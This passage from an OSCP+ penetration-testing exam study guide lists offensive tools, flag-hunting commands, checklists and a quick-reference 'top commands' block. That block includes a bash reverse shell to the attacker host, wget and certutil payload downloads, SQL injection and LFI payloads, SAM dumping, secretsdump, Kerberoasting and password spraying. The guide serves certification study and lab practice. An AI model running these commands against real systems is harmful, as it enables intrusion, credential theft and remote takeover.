✅ netexec (nxc) / crackmapexec   spray + enum + PtH across smb/winrm/ldap/mssql/rdp/ssh
✅ smbclient / smbmap             list & access shares
✅ enum4linux-ng / enum4linux     one-shot SMB/RPC/LDAP enum
✅ rpcclient / nbtscan / nmblookup   RPC user enum & NetBIOS
✅ ldapsearch / windapsearch / ldapdomaindump   LDAP/AD directory dump
✅ snmpwalk / snmp-check / onesixtyone   SNMP loot
✅ dig / dnsrecon / dnsenum        DNS + zone transfers
✅ showmount / mount               NFS
```

## 5) Active Directory attack
```
✅ impacket-*   psexec/wmiexec/smbexec/atexec/dcomexec/secretsdump/GetUserSPNs/GetNPUsers/
                getTGT/getST/ntlmrelayx/lookupsid/mssqlclient  — the AD swiss-army knife
✅ bloodhound / bloodhound-python / SharpHound   the graph (find the path)
✅ kerbrute            user enum + password spray over Kerberos
✅ certipy             ADCS (ESC1–8) abuse
✅ bloodyAD / pywhisker / owneredit / dacledit   ACL edits, shadow creds
✅ Rubeus / PowerView / mimikatz / pypykatz      Windows-side Kerberos/creds
✅ evil-winrm          WinRM shell (`-u -p` / `-H` PtH)
⚠️ Responder / Inveigh   ANALYZE mode only (`-A`) — LLMNR/NBNS/WPAD POISONING (`-w`) is ⛔ BANNED
⛔ mitm6/bettercap ARP·DNS spoofing   BANNED (spoofing)
```

## 6) Password attacks & cracking
```
✅ hashcat / john      offline cracking (`-m` mode / rules; john auto-detects)
✅ *2john              ssh2john / zip2john / keepass2john / office2john → crackable hashes
✅ hydra / medusa      online brute (evidence + lockout-aware only; last resort)
✅ netexec / kerbrute  password spraying (check --pass-pol first)
✅ cewl / crunch       build custom wordlists
✅ hashid / name-that-hash   identify a hash type
✅ gpp-decrypt / LaZagne / mimikatz   recover stored creds
```

## 7) Exploit research & payloads
```
✅ searchsploit        offline Exploit-DB (`-m` copy, `-x` view, `-u` update) — READ before running
✅ msfvenom            payload generator (exe/elf/msi/aspx/war/dll/raw) — usable on ALL boxes
✅ gcc / mingw-w64     compile/cross-compile exploits  [FIXING-EXPLOITS]
✅ public PoCs (GitHub/EDB)   allowed if you understand + run them manually
```

## 8) Metasploit (special rules)
```
1️⃣ msfconsole modules (exploit/post) + Meterpreter   ONE target only; locks you to it; NOT for pivoting
✅ msfvenom + exploit/multi/handler                   exempt — usable everywhere
```

## 9) Shells, listeners & file transfer
```
✅ nc (netcat) / socat / ncat        listeners + shells (`nc -lvnp 443`; socat full TTY)
✅ python3 -m http.server            serve files to targets
✅ impacket-smbserver                SMB drop for Windows
✅ certutil / bitsadmin / curl.exe   (on target) Windows downloads
✅ powercat / Invoke-ConPtyShell     PS netcat + real Windows TTY
✅ revshells.com (offline copy)      reverse-shell generator  [SHELL-REVSHELLS]
```

## 10) Pivoting & tunneling
```
✅ ligolo-ng          cleanest pivot (routed interface, native tools)  [PIVOT-LIGOLO]
✅ chisel             SOCKS/port-forward over HTTP  [PIVOT-CHISEL]
✅ sshuttle / ssh -L/-R/-D   SSH-based pivots  [PIVOT-SSH]
✅ proxychains(4)     run tools through a SOCKS proxy
✅ plink / netsh portproxy   Windows-side forwarding
```

## 11) Privilege-escalation enumeration
```
✅ linpeas / winpeas         automated local enum (read RED; verify manually)
✅ pspy                      catch cron/root processes (no root needed)
✅ PowerUp / Seatbelt / PrivescCheck / JAWS   Windows privesc checks
✅ accesschk / icacls        Windows permission checks
✅ PrintSpoofer / GodPotato / JuicyPotatoNG / RoguePotato / SharpEfsPotato   SeImpersonate → SYSTEM
✅ wesng / windows-exploit-suggester / linux-exploit-suggester   kernel-exploit leads
✅ GTFOBins / LOLBAS (bookmarks)   binary-abuse references
```

## 12) Wordlists & references (ship with Kali)
```
✅ /usr/share/wordlists/rockyou.txt   (gunzip once) · /usr/share/seclists/ · /usr/share/webshells/
✅ dirb/dirbuster lists · nmap NSE scripts (/usr/share/nmap/scripts)
```

## 13) Notes & screenshots (for the report)
```
✅ CherryTree / Obsidian / Sublime / vim   note-taking
✅ Flameshot / gnome-screenshot / Greenshot   screenshots (flag + whoami/id + ip in ONE shot)
✅ script / tmux   command logging + persistent sessions
```

## ⛔ BANNED / avoid (using these can void points — `[EXAM-RULES-2026]`)
```
⛔ sqlmap, sqlninja, db_autopwn, browser_autopwn   (automatic exploitation)
⛔ Nessus, OpenVAS, Nexpose                         (mass/auto vuln scanners)
⛔ Responder/Inveigh POISONING, bettercap, ARP/DNS spoofing   (spoofing)
⛔ Burp Pro, Metasploit Pro, other commercial tools
⛔ AI / LLM chatbots during the exam AND report   (this KB as STATIC notes = allowed)
1️⃣ Metasploit modules/Meterpreter beyond your ONE chosen target
```

**Reality check:** you'll pass using maybe 15 of these constantly — nmap, feroxbuster/ffuf, netexec, smbclient, impacket, evil-winrm, BloodHound, linpeas/winpeas, the potatoes, hashcat, ligolo/chisel, nc/socat, searchsploit, msfvenom. Learn those cold; the rest are situational.

---

# [FLAG-HUNT]  🚩 find the flag on any box (paste-and-go)
> Flags are usually named `proof.txt` / `local.txt` (also `flag.txt`/`root.txt`/`user.txt`) and live on a **user's Desktop** (Windows) or **`/root`** / **`/home/<user>`** (Linux). If they're not there, search by **name** then by **content**.

## 🪟 Windows — PowerShell (in evil-winrm / PS shell)
```
whoami                                                         # who am I? (flag is often on THIS user's Desktop)
dir C:\Users\ ; dir C:\Users\*\Desktop\                        # list users + their desktops
type C:\Users\*\Desktop\*.txt                                  # dump every desktop .txt
# search by FILENAME anywhere:
Get-ChildItem C:\ -Recurse -Force -Include proof.txt,local.txt,flag.txt,root.txt,user.txt -EA SilentlyContinue | Select FullName
# search by CONTENT (flag marker):
Get-ChildItem C:\Users\ -Recurse -Include *.txt -EA SilentlyContinue | Select-String -Pattern 'OS\{|flag' -List
```
## 🪟 Windows — cmd
```
dir /s /b C:\proof.txt C:\*flag*.txt 2>nul                     # find by name
where /r C:\ proof.txt                                          # locate proof.txt
type C:\Users\Administrator\Desktop\proof.txt                   # common spot
findstr /s /i "OS{ flag" C:\Users\*.txt 2>nul                   # find by content
```
## 🐧 Linux (on a target shell)
```
id                                                             # who am I?
ls -la /root/ /home/*/ 2>/dev/null                             # the two usual spots
cat /root/*.txt /home/*/*.txt 2>/dev/null                      # dump them
# by FILENAME anywhere:
find / \( -iname 'proof.txt' -o -iname 'local.txt' -o -iname 'flag*.txt' -o -iname 'root.txt' -o -iname 'user.txt' \) -not -path '/proc/*' 2>/dev/null
# by CONTENT (flag marker), excluding noise dirs:
grep -rliE 'flag\{|OS\{' --exclude-dir={proc,sys,run,dev,.cache} /root /home /var /opt /tmp /etc 2>/dev/null
```
**If nothing:** you may not have the right privileges yet (a root-only flag needs privesc first), or you're on the wrong host — `whoami`/`id`, then check the *other* users' homes/desktops (as admin/root you can read them all).

# [MACHINE-JOURNAL] reusable worksheet (copy per target)
```
TARGET: __________  IP: __________  HOSTNAME: __________  OS: __________
DATE: ____  START: ____  (AD set? Y/N)  PROVIDED CREDS: __________

OPEN PORTS (from all-tcp + scv):
 PORT  SERVICE  VERSION  ENUM DONE?  FINDINGS
 ____  _______  _______  ________    ________________

WEB:  URLs ____  VHOSTS ____  DIRS ____  PARAMS ____  TECH/VERSION ____  LOGIN/UPLOAD? ____

CREDENTIALS (source → user:pass/hash → tried where → works?):
 - ______________________________________________

INITIAL ACCESS HYPOTHESES (claim / test / timebox):
 H1: ______  test: ______  result: ______  next: ______
 H2: ______  test: ______  result: ______  next: ______

FOOTHOLD: user ____ via ____ (screenshot: local.txt + id/whoami + ip ✔)

LOCAL ENUM: sudo -l / whoami-priv ____  SUID/services ____  creds looted ____  internal subnets ____

PRIVESC: vector ____  → root/SYSTEM (screenshot: proof.txt + whoami + ip ✔)

LATERAL / PIVOT: creds reused on ____  tunnel ____  new hosts ____

AD: BloodHound path ____  roasts ____  ACL edges ____  DCSync ✔?

PROOF CAPTURED: [ ] local.txt  [ ] proof.txt  [ ] AD each host  [ ] flags entered in panel

WHAT I MISSED (post-mortem): ____________________
LESSON LEARNED: ____________________
```

---

# FINAL DELIVERABLES

## A. [MASTER-INDEX] → see Volume 0 (full tag list + volume map).

## B. [TOP-100-THINGS] (condensed to the highest-value ~50 principles; expand via tags)
1 Enumerate all ports+web before exploiting. 2 AD = 40 pts, do it first/most. 3 No bonus points — need clean 70. 4 Metasploit one target only. 5 Spray every cred everywhere. 6 Cheapest test first. 7 Screenshot proof immediately (flag+id+ip). 8 Notes continuously, one file/target. 9 Re-enumerate after every privilege change. 10 Read tool output literally. 11 `-p-` always. 12 Quick UDP top-100. 13 Manual > MSF for muscle memory. 14 Password reuse beats exploits. 15 Stabilize shells before working. 16 Kerberoast + AS-REP every AD. 17 BloodHound early, mark Owned. 18 Verify scanners manually (false positives). 19 One box's loot unlocks others. 20 Rotate targets to break tunnel vision. 21 Understand exploits before running. 22 Save all artifacts. 23 `sudo -l`/`whoami /priv` first on any shell. 24 Loot configs/history/backups/git/DB. 25 Reverts are free. 26 Report is graded — repro steps required. 27 No one-click AD auto-pwn on exam. 28 Eat/sleep/break. 29 Fix Kerberos clock skew. 30 LFI value is often file-read not RCE. 31 SUID/sudo → GTFOBins. 32 SeImpersonate → Potato → SYSTEM. 33 Unquoted path needs a writable segment. 34 NTLM hash → PtH before cracking. 35 MSSQL → xp_cmdshell; Postgres → COPY PROGRAM; MySQL → FILE. 36 Add hostnames to /etc/hosts. 37 vhost fuzz with `-fs` baseline. 38 SNMP/UDP hides creds in process args. 39 SMB null/guest → shares/users. 40 WriteDACL/WriteOwner/GenericAll → own the object. 41 DCSync = game over. 42 Ligolo > proxychains where possible; `-sT` over SOCKS. 43 15-min re-read / 30-min switch. 44 If it needs a 0-day, you missed enum. 45 Timebox every hypothesis. 46 Try anonymous/default first. 47 Common egress ports 443/80/8080 for shells. 48 LHOST = tun0, not eth0. 49 Kernel exploits last. 50 Enter flags in the panel AND show in report.

## C. [TOP-100-COMMANDS] (the ones you actually type)
```
# ENUM
nmap -p- --min-rate 2000 -Pn -oN all.txt $IP
nmap -p<ports> -sCV -Pn -oN scv.txt $IP
nmap -sU --top-ports 100 -Pn $IP
whatweb http://$IP ; curl -sI http://$IP
feroxbuster -u http://$IP -x php,txt,html
ffuf -u http://$IP/FUZZ -w dirlist.txt
ffuf -u http://$IP -H "Host: FUZZ.$D" -w subs.txt -fs N
nxc smb $IP ; nxc smb $IP -u '' -p '' --shares
enum4linux-ng -A $IP ; smbclient -N -L //$IP/
snmpwalk -v2c -c public $IP ; snmp-check $IP
dig axfr @$IP $D ; showmount -e $IP
ldapsearch -x -H ldap://$IP -b "dc=..,dc=.."
rpcclient -U '' -N $IP   (enumdomusers)
# WEB/SQLI
sqlmap -r req.txt --batch --dbs
' UNION SELECT 1,2,3-- -   ;   ' OR 1=1-- -
?page=../../../../etc/passwd ; php://filter/convert.base64-encode/resource=index.php
# SHELLS/TRANSFER
nc -lvnp 443
bash -i >& /dev/tcp/$LHOST/443 0>&1
python3 -c 'import pty;pty.spawn("/bin/bash")' ; stty raw -echo; fg
python3 -m http.server 80 ; impacket-smbserver share . -smb2support
wget http://$LHOST/f -O /tmp/f ; certutil -urlcache -split -f http://$LHOST/f f
# LINUX PRIVESC
id; sudo -l; find / -perm -4000 2>/dev/null; getcap -r / 2>/dev/null
cat /etc/crontab; ./linpeas.sh
# WINDOWS PRIVESC
whoami /all; whoami /priv; systeminfo; cmdkey /list
.\winPEASx64.exe ; PrintSpoofer64.exe -i -c cmd
reg save HKLM\SAM sam & reg save HKLM\SYSTEM sys
# CREDS/HASH
secretsdump.py $D/$U:$P@$IP ; nxc smb $IP -u $U -H $H
hashcat -m 1000 h rockyou.txt ; hashcat -m 13100 tgs rockyou.txt -r best64.rule
# AD
bloodhound-python -u $U -p $P -d $D -ns $DC -c all --zip
impacket-GetUserSPNs -request $D/$U:$P -dc-ip $DC
impacket-GetNPUsers $D/ -no-pass -usersfile users -dc-ip $DC
nxc smb <subnet> -u $U -p $P --continue-on-success
evil-winrm -i $IP -u $U -p $P ; impacket-psexec $D/$U:$P@$IP
net rpc password target newpass -U "$D/$U%$P" -S $DC
# PIVOT
./proxy -selfcert ; ./agent -connect $LHOST:11601 -ignore-cert
ssh -D 1080 user@pivot ; proxychains nxc smb 172.16.5.0/24
./chisel server -p 8000 --reverse ; ./chisel client $LHOST:8000 R:socks
```

## D. [TOP-50-ENUM-CHECKS]
Full `-p-` TCP; `-sCV` on open; top-100 UDP; every web port fully; whatweb+headers+source+robots+JS; dir brute (recursive)+extensions; vhost fuzz; param discovery; SMB null/guest shares+users+rid-brute; enum4linux-ng; read every readable share; SNMP `public` walk; DNS zone transfer + SRV; LDAP anon bind + descriptions; rpcclient users; NFS showmount+mount; FTP anon+upload; SMTP user enum; MSSQL/MySQL/Postgres default creds; Redis/Mongo unauth; searchsploit every version; check `/.git`,`.env`,backups; TLS cert SAN for vhosts; add hostnames to `/etc/hosts`; re-scan after new access; identify OS via TTL/nmap; note internal subnets; check default creds on every login; look for upload/exec features; test one injection char per param; capture Responder if on-subnet; check WinRM/RDP reachability with creds; kerberoast+asrep every AD; BloodHound collect; password policy before spray; spray each cred all services; check process lists (pspy/ps); check `sudo -l`/`whoami /priv`; look for creds in configs/history; check cron/scheduled tasks; enumerate installed software versions; check writable dirs/files; check capabilities; verify each scanner finding manually.

## E. [TOP-50-LINUX-PRIVESC-CHECKS]
`id`; `sudo -l`; SUID `find -perm -4000`; SGID `-2000`; capabilities `getcap -r /`; `/etc/crontab`+cron.d/daily; pspy for hidden crons; writable scripts run by root; wildcard-injection dirs; PATH-hijackable SUID (strings/ltrace); systemd writable units/timers; writable `/etc/passwd`/`shadow`/`sudoers(.d)`; NFS `no_root_squash`; docker/lxd group; docker socket; container caps/mounts; `~/.ssh` keys (reuse); `~/.bash_history`+`.*_history`; config creds (`/var/www`,`.env`,DB); `.kdbx`/keepass; backups; mounted fstab creds; root processes (`ps aux`); LD_PRELOAD/LD_LIBRARY in sudo env_keep; sudo version CVEs (3156/14287); pkexec PwnKit; kernel `uname`+les2 (last); MySQL blank root; internal services (`ss -tlnp`); cron on `/etc/cron.d`; setuid perl/python caps; writable `/opt`/`/usr/local/bin`; group memberships (`id`); readable `/root` via cap_dac; SUID nmap/vim/find (GTFOBins); `authorized_keys` writable; `.netrc`/git creds; snmp on localhost; env creds; tmp race scripts; message-of-the-day writable; log-writable for injection; python library hijack; sudo edit of tar/zip; abusing `screen`/`tmux` sockets; check `getcap` on python.

## F. [TOP-50-WINDOWS-PRIVESC-CHECKS]
`whoami /all`+`/priv`; SeImpersonate→Potato; SeAssignPrimaryToken→Potato; SeBackup/Restore→SAM/NTDS; SeTakeOwnership; SeDebug→LSASS; SeLoadDriver; unquoted service paths (writable segment); weak service binary perms; service DACL `sc config`; DLL hijack/search order; AlwaysInstallElevated (HKLM+HKCU); writable Run/autorun keys; autologon `Winlogon` DefaultPassword; `cmdkey /list`+runas savecred; saved creds/DPAPI; PowerShell history file; unattend/sysprep xml; GPP cpassword; `web.config`/connection strings; KeePass; browser creds; scheduled tasks weak binary; startup folder writable; writable PATH dir before system32; installed vuln software (`wmic product`); app-pool identity (SeImpersonate); token impersonation (incognito); UAC bypass (if medium-IL admin); named-pipe impersonation; `runas /netonly`; hardcoded creds in scripts/registry; `reg query` for passwords; accessible SAM/SYSTEM backups; writable service registry key; `wsl`/docker on Windows; MSSQL service acct→SYSTEM; weak folder perms in `C:\`; `Program Files` writable; missing patches (`systeminfo`→wesng, last); credential manager vault; Wi-Fi profiles; `net user`/local admins; scheduled task run-as; COM hijack; printnightmare (context); check `whoami /groups` integrity level.

## G. [TOP-50-AD-CHECKS]
Fix clock skew; `nxc smb $DC` domain/host; validate provided cred; BloodHound `-c all` early; mark Owned nodes; Kerberoast `GetUserSPNs -request`; AS-REP `GetNPUsers`; crack roasts (13100/18200); spray each cred all hosts (`--continue-on-success`); password policy/lockout first; RID brute users; LDAP anon bind + `description`; `ldapdomaindump`; read SYSVOL/NETLOGON scripts; GPP cpassword; find SPNs; delegation flags (unconstrained/constrained/RBCD); ACL edges (GenericAll/Write/DACL/Owner/AddMember/AddKeyCredentialLink); ForceChangePassword; shadow credentials (certipy/pywhisker); targeted Kerberoast; DCSync rights; `secretsdump` a host you own (SAM/LSA); LSASS on owned host; reuse local admin hash across hosts (PtH); find where cred is local admin (Pwn3d!); psexec/wmiexec/evil-winrm/rdp; ADCS vuln templates (certipy find, ESC1/8); LAPS readable; gMSA readable; trust relationships; `ExtraSids`/SID history; Golden/Silver ticket (post-krbtgt); Pass-the-Ticket (getTGT/KRB5CCNAME); `-k` FQDN issues; MSSQL links to other hosts; coerce auth (printerbug) to relay/unconstrained; check `ms-DS-MachineAccountQuota` (add computer for RBCD); readable `description`/notes for creds; group memberships up to DA; find DA-session hosts; DNS SRV for DCs; SMB signing off host for relay; kerberoast without pre-auth (AS-REP as entry); re-run BloodHound "from owned" after each new principal.

## H. [TOP-50-TROUBLESHOOTING-CHECKS]
LHOST=tun0; listener up; egress port (443/80/8080); URL-encode web payloads; base64 commands; try sh/python/nc; AV on PS (`-ep bypass`/nc.exe); tcpdump to see SYN; `curl -v` replicate browser; add `Host:`/cookie/UA; `-L -k`; py2 vs py3; match exploit version/arch; install deps; change hardcoded IP; SMB `-d DOMAIN`/`--local-auth`; SMBv1 `NT1`; PtH `-H`; Kerberos skew `ntpdate`; FQDN+`/etc/hosts` for SPN; WinRM rights vs SMB; TLS 5986 `-S`; TTY full upgrade; `stty rows/cols`; certutil→curl.exe/bitsadmin/SMB; binary transfer mode; hashcat mode/format; strip username; rules+bigger list; chisel port/arch/`--reverse`; proxychains `socks5 127.0.0.1 1080`+`-sT`; ligolo route+session; DNS→/etc/hosts; vhost `-fs` baseline; nmap `-Pn`+lower rate; kernel exploit build match; revert crashed box; re-enumerate when stuck; verify tunnel with a known-open port; check password expired/reset; check lockout before spray; confirm you're on the right subnet; confirm proof screenshot has all 3 elements.

## I. [TOP-50-FOUND-SCENARIOS] → all covered above under `[FOUND-*]`
creds, ssh key, SUID, sudo, SMB, writable service, pw in config, git, backup, SQLi, LFI, RFI, cmd injection, SSRF, SSTI, XXE, upload, deserialize, IDOR, JWT, domain user, SPN, AS-REP user, hash, NTLM hash, Linux shell, Windows shell, WinRM, RDP, LDAP anon, SNMP public, NFS export, MSSQL creds, MySQL/Postgres/Redis/Mongo, Kerberos port 88, BloodHound GenericAll/WriteDACL/WriteOwner/AddKeyCredentialLink/DCSync, delegation, pivot host, dual-homed subnet, cracked service account, readable share, unattend.xml, GPP cpassword, phpinfo, exposed .env, default creds page.

## J. [FINAL-DAY-QUICK-REFERENCE]  (print this)
```
SET UP: folder per target (scans/loot/exploits/www/notes.md). VPN up. LHOST=tun0. Screenshot tool ready. Note template open.
KICK OFF: nmap -p- --min-rate 2000 -Pn on ALL targets in parallel. Read briefs.
PRIORITY: AD set FIRST (fresh brain). Standalones after. Rotate on 30-min rule.
EACH TARGET: -sCV open ports → per-service enum → creds → foothold → stabilize → local enum → privesc → PROOF SCREENSHOT NOW.
EVERY CRED: spray all services/hosts/users + variations.
AD: skew fix → BloodHound → Kerberoast+AS-REP → spray → ACL path → DCSync → PtH DC.
STUCK 30 min: [STUCK-PROTOCOL] → re-enum → switch target.
PROOF = flag + whoami/id + ip/ipconfig in ONE shot. Enter flag in panel.
LAST 3 HRS: stop hacking, verify all proofs + screenshots + notes complete.
METASPLOIT: one target only. Manual everything else.
BREAKS: eat, hydrate, sleep 4-6h. Fatigue = tunnel vision.
```

## K. [MINIMUM-VIABLE-PREP-PLAN] → Volume 0 Part 31 (study deep: AD, enum, privesc, web core, pivoting; practice ~40–60 boxes AD-weighted; skim BOF/exotic).

## L. [7-DAY-PLAN] → Volume 0 Part 32.

## M. [CURRENT-OFFSEC-RULES] → Volume 0 (23h45m+24h, 100/70, 40 AD + 3×20, no bonus, MSF one target, proof = flag+whoami+ip, report required, OSCP+ 3-yr).

## [RESOURCES]  🔗 external tools & references (bookmark — and cache OFFLINE)
> On the OSCP exam you **may** use public internet references (docs, GTFOBins, public exploits) — you may **not** use AI chatbots (`[EXAM-RULES-2026]`). Still, **save offline copies** of the starred ★ ones in case of connectivity issues on the day.

### Exploit / CVE research
- [Exploit-DB (EDB)](https://www.exploit-db.com/) — OffSec's public exploit archive; mirrored locally by `searchsploit`.
- [Google Hacking DB (GHDB)](https://www.exploit-db.com/google-hacking-database) — dork reference.
- [NVD (NIST CVE database)](https://nvd.nist.gov/) · [CVEDetails](https://www.cvedetails.com/) — look up a version's CVEs.
- [PacketStorm](https://packetstormsecurity.com/) — additional exploit archive.

### Privilege escalation / binary abuse ★
- ★ [GTFOBins](https://gtfobins.github.io/) — Linux SUID/sudo/capability escapes (the KB defers here 25×).
- ★ [LOLBAS](https://lolbas-project.github.io/) — Windows living-off-the-land binaries.
- [WADComs](https://wadcoms.github.io/) — Windows/AD offensive command lookup.

### Visual mind maps (attack-path flowcharts — glance to find your next move)
- ★ [Orange Cyberdefense mind maps](https://orange-cyberdefense.github.io/ocd-mindmaps/) — the famous **Active Directory** attack mind map (and pentest/web ones). Print/cache it — a visual companion to `[AD-ATTACK-PATH]`.
- [PayloadsAllTheThings AD README](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources) — text methodology maps.

### Web / general technique ★
- ★ [HackTricks](https://book.hacktricks.xyz/) — the big per-service/technique reference.
- ★ [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) — payloads for every web vuln.
- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/) — methodology.

### Shells / hashes / wordlists ★
- ★ [revshells.com](https://www.revshells.com/) — reverse-shell generator (fill IP+port).
- [hashcat example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) — identify the right `-m` mode. · [hashcat](https://hashcat.net/hashcat/)
- [SecLists](https://github.com/danielmiessler/SecLists) — wordlists (ships with Kali under `/usr/share/seclists`).

### Core tool repos (download binaries from "Releases")
- [PEASS-ng (linpeas/winpeas)](https://github.com/peass-ng/PEASS-ng) · [pspy](https://github.com/DominicBreuker/pspy)
- [Impacket](https://github.com/fortra/impacket) · [NetExec](https://github.com/Pennyw0rth/NetExec) · [BloodHound](https://github.com/SpecterOps/BloodHound) · [BloodHound.py](https://github.com/dirkjanm/BloodHound.py)
- [Ligolo-ng](https://github.com/nicocha30/ligolo-ng) · [chisel](https://github.com/jpillora/chisel)
- [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) · [GodPotato](https://github.com/BeichenDream/GodPotato) · [mimikatz](https://github.com/gentilkiwi/mimikatz)
- [Rubeus](https://github.com/GhostPack/Rubeus) · [PowerSploit (PowerView/PowerUp)](https://github.com/PowerShellMafia/PowerSploit) · [Certipy](https://github.com/ly4k/Certipy)

### Exam-safe enumeration automation (allowed — no auto-exploitation)
- [AutoRecon](https://github.com/Tib3rius/AutoRecon) — multi-threaded auto-enum; built to comply with OSCP rules.
- [nmapAutomator](https://github.com/21y4d/nmapAutomator) — staged nmap + service enum wrapper.
- See `[EXAM-SCRIPTS]` for your own copy-paste helper (`oscp.sh`).

### Practice (do boxes here)
- [OffSec Proving Grounds](https://www.offsec.com/labs/) — closest to exam ("PG Practice").
- [Hack The Box](https://www.hackthebox.com/) — use **TJ_Null's OSCP-like list** (search "TJ Null OSCP-like NetSecFocus") + IppSec videos.
- [OffSec exam guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide) — **re-read before your sitting** (rules can change).

### [RESOURCES-MORE]  every other named tool (so nothing is unlinked)
**Windows privesc — potatoes & enum:**
[RunasCs](https://github.com/antonioCoco/RunasCs) · [RoguePotato](https://github.com/antonioCoco/RoguePotato) · [JuicyPotatoNG](https://github.com/antonioCoco/JuicyPotatoNG) · [SweetPotato](https://github.com/CCob/SweetPotato) · [SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato) · [SigmaPotato](https://github.com/tylerdotrar/SigmaPotato) · [FullPowers](https://github.com/itm4n/FullPowers) · [PrivescCheck](https://github.com/itm4n/PrivescCheck) · [Seatbelt](https://github.com/GhostPack/Seatbelt) · [JAWS](https://github.com/411Hall/JAWS) · [Watson](https://github.com/rasta-mouse/Watson) · [wesng](https://github.com/bitsadmin/wesng) · [UACME](https://github.com/hfiref0x/UACME)

**Linux privesc enum:**
[LinEnum](https://github.com/rebootuser/LinEnum) · [linux-exploit-suggester](https://github.com/The-Z-Labs/linux-exploit-suggester) · [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker)

**Shells / transfer:**
[Powercat](https://github.com/besimorhino/powercat) · [ConPtyShell](https://github.com/antonioCoco/ConPtyShell) · [evil-winrm](https://github.com/Hackplayers/evil-winrm)

**AD — Kerberos / ACL / certs:**
[kerbrute](https://github.com/ropnop/kerbrute) · [bloodyAD](https://github.com/CravateRouge/bloodyAD) · [pywhisker](https://github.com/ShutdownRepo/pywhisker) · [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) · [pyGPOAbuse](https://github.com/Hackndo/pyGPOAbuse) · [Certify](https://github.com/GhostPack/Certify) · [PassTheCert](https://github.com/AlmondOffSec/PassTheCert) · [gMSADumper](https://github.com/micahvandeusen/gMSADumper) · [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) · [windapsearch](https://github.com/ropnop/windapsearch) · [enum4linux-ng](https://github.com/cddmp/enum4linux-ng)

**AD — cred dumping / coercion / relay:**
[LaZagne](https://github.com/AlessandroZ/LaZagne) · [pypykatz](https://github.com/skelsec/pypykatz) · [lsassy](https://github.com/Hackndo/lsassy) · [mitm6](https://github.com/dirkjanm/mitm6) · [Inveigh](https://github.com/Kevin-Robertson/Inveigh) · [PetitPotam](https://github.com/topotam/PetitPotam) · [Coercer](https://github.com/p0dalirius/Coercer) · [ntlm_theft](https://github.com/Greenwolf/ntlm_theft)

**Web / git:**
[PHPGGC](https://github.com/ambionics/phpggc) · [GitTools](https://github.com/internetwache/GitTools) · [git-dumper](https://github.com/arthaud/git-dumper)

> **Kali built-ins don't need download links** — nmap, ffuf/feroxbuster/gobuster, nikto, hydra/medusa, john/hashcat, sqlmap, smbclient/smbmap, enum4linux, rpcclient, ldapsearch, snmpwalk, responder, proxychains, sshuttle, masscan, cewl, crunch, dnsrecon, wpscan, etc. all ship with Kali (`apt`); see `[KALI-SETUP]`/`[KALI-TOOLBOX]`.

> ⚠️ Links/repos move over time — if one 404s, search the project name. Always confirm tool **flag syntax** against the version installed on your Kali.

## N. [SOURCES]
- [OSCP+ Exam Guide – OffSec Support Portal](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide) — official exam structure, proof, tool rules.
- [OSCP+ Exam FAQ – OffSec Support Portal](https://help.offsec.com/hc/en-us/articles/4412170923924-OSCP-Exam-FAQ) — Metasploit/tool clarifications.
- [Changes to the OSCP – OffSec](https://help.offsec.com/hc/en-us/articles/29840452210580-Changes-to-the-OSCP) — OSCP vs OSCP+, bonus removal.
- [Everything you need to know about the OSCP+ – OffSec Blog](https://www.offsec.com/blog/everything-you-need-to-know-about-the-oscp-plus/) — official OSCP+ overview.
- [Renewing OffSec Certification – OffSec](https://help.offsec.com/hc/en-us/articles/36010548001812-Renewing-OffSec-Certification-by-Taking-a-Qualifying-Certification-Exam) — 3-year renewal paths.
- [OSCP Exam Guide (2026) – StationX](https://www.stationx.net/oscp-exam-guide/) — [COMMUNITY] structure summary.
- [OSCP+ 2026 Update – Macksofy](https://www.macksofytrainings.com/oscp-plus-2026-update-new-exam-structure-ad-sets/) — [COMMUNITY] AD-set emphasis.
- **Tool/technique references** [GENERAL], verify syntax on official docs: GTFOBins, HackTricks, PayloadsAllTheThings, Impacket/NetExec/BloodHound/Ligolo-ng/Chisel/hashcat docs, TJ Null's OSCP-like list. *(This KB synthesizes these — always confirm exact flags against the current tool version.)*

---
*End Volume 6. Full KB = VOL-0 … VOL-6. Merge: `cat VOL-*.md > OSCP-KB-COMPLETE.md`.*


# OSCP+ KNOWLEDGE BASE — VOLUME 7
## SYLLABUS COMPLETION + EXAM-DAY FLOW + BEGINNER PATH
### Client-Side & Phishing · Fixing Exploits · AV Evasion · Metasploit · DPI Tunneling · Cloud (course-only) · Exam-Day Flow · Syllabus Map

> This volume closes the remaining PEN-200 syllabus modules and adds the wrapper that ties all volumes together. Exam-relevance is labelled honestly so a beginner knows where to spend time.
> `$IP`=your Kali VPN IP (tun0). `$T`=target.

---

# [BEGINNER-START-HERE]  (you are new — read this first)

**The exam is 80% enumeration + decision-making, not exploit memorization.** Your job is to build reflexes on machines, using this KB as the "what do I check next" copilot.

**Learning order (map PEN-200 modules → what to actually DO):**
1. **Get comfortable:** Kali, bash, `nmap`, `curl`, file transfer (`[FILETRANSFER-QUICK]`), shells (`[SHELL-QUICK]`). Drill until automatic.
2. **Enumeration reflexes** (Vol 1): run the `[NMAP-QUICK]` two-step + per-service `[ENUM-*]` on 10+ easy boxes.
3. **Web + SQLi** (Vol 2): the most common foothold. Practice `[WEB-QUICK]` → `[WEB-LFI]`/`[WEB-UPLOAD]`/`[SQLI]`.
4. **Foothold + exploits** (Vol 3): `[FOOTHOLD-CHECKLIST]`, `[EXPLOIT-RESEARCH]`, `[FIXING-EXPLOITS]`.
5. **Privilege escalation** (Vol 4): Linux + Windows. Top ~15 vectors each cover most boxes.
6. **Pivoting** (Vol 5): `[PIVOT-QUICK]` with Ligolo/Chisel until boring.
7. **Active Directory** (Vol 5): **the 40-point core.** Practice full chains, not single boxes.
8. **Client-side, AV, Metasploit, Cloud** (this volume): lighter — know them, don't over-invest (see relevance labels).

